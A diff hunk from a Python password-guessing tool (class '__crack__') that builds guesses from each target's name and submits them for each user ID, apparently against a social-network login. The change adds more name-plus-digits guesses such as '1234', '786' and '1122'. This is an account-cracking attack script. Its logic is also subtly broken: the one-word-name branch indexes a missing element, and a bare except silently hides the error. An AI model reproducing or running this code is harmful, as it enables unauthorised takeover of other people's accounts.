@@ -331,15 +331,15 @@ class __crack__:
 						uid, name = yntkts.split('|')
 						xz = name.split(' ')
 						if len(xz) == 1:
-							pwx = [name, xz[0]+xz[1], xz[0]+"123"]
+							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+"786", xz[0]+"110", xz[0]+"1122"]
 						elif len(xz) == 2:
-							pwx = [name, xz[0]+xz[1], xz[0]+"123"]
+							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+"786", xz[0]+"110", xz[0]+"1122"]
 						elif len(xz) == 3:
-							pwx = [name, xz[0]+xz[1], xz[0]+"123"]
+							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+"786", xz[0]+"110", xz[0]+"1122"]
 						elif len(xz) == 4:
-							pwx = [name, xz[0]+xz[1], xz[0]+"123"]
+							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+"786", xz[0]+"110", xz[0]+"1122"]
 						else:
-							pwx = [name, xz[0]+xz[1], xz[0]+"123"]
+							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+"786", xz[0]+"110", xz[0]+"1122"]
 						_ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
 					except:
 						pass
